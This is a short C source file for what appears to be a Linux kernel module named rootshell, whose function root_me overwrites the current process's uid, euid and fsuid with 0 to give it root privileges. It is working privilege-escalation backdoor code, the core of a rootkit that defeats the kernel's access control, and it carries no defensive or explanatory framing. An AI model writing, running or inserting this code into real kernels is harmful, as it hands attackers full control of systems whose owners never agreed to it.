#include <linux/sched.h>

#include "rootshell.h"

// Grant the current process root privileges
void root_me(void)
{
  // Stop the compiler from whining about "const"
  uid_t* v = (uid_t*) &current->cred->uid;
  *v = 0;
  v = (uid_t*) &current->cred->euid;
  *v = 0;
  v = (uid_t*) &current->cred->fsuid;
  *v = 0;
}

